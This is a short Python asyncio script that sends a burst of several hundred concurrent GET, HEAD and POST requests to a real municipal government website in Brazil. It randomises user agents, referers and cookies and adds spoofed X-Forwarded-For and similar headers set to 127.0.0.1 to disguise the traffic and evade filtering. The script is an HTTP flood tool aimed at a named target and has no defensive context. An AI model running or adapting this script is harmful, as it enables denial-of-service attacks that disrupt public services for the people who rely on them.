import aiohttp
import asyncio
import random
import aiofiles
import string

async def load_list_from_file(file_path):
    async with aiofiles.open(file_path, mode='r') as file:
        lines = await file.read()
    return lines.splitlines()

def generate_headers(user_agent, referer, cookie):
    return {
        'User-Agent': user_agent,
        'Referer': referer,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'DNT': '1',
        'Connection': 'keep-alive',
        'X-Originating-IP': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1, 127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'X-Host': '127.0.0.1',
        'X-Forwarded-Host': '127.0.0.1',
        'X-ProxyUser-Ip': '127.0.0.1',
        'Cookie': cookie,
    }

async def generate_cookie():
    cookie_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    cookie_value = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    return f"{cookie_name}={cookie_value}"

async def make_request(session, method, url, headers, count):
    try:
        async with session.request(method, url, headers=headers) as response:
            if response.status == 200:
                print(f"Request #{count} sent successfully")
            return response.status
    except Exception as e:
        print(f"Request #{count} failed: {e}")

async def main():
    user_agents = await load_list_from_file('useragents.txt')
    referers = await load_list_from_file('referers.txt')
    url = "https://www.guaruja.sp.gov.br/"
    methods = ['GET', 'HEAD', 'POST']
    count = 1

    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(197):
            for method in methods:
                user_agent = random.choice(user_agents)
                referer = random.choice(referers)
                cookie = await generate_cookie()
                headers = generate_headers(user_agent, referer, cookie)
                task = asyncio.ensure_future(make_request(session, method, url, headers, count))
                tasks.append(task)
                count += 1
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())